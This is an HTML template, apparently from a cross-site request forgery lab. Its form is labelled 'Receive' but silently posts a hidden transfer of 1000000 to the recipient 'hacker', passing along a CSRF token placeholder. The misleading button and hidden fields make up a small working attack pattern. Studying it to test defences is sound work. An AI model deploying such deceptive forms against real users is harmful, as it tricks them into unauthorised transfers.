<!DOCTYPE html>
<html lang="en"
      xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Form</title>
    <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    input {
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

<h1>Transfer</h1>

<form action="/transfer" method="post">
    <input name="value" type="hidden" value="1000000">
    <input type="hidden" name="csrf_token" th:value="${csrfToken}">
    <input name="to" type="hidden" value="hacker">
    <button type="submit">Receive</button>
</form>

</body>
</html>
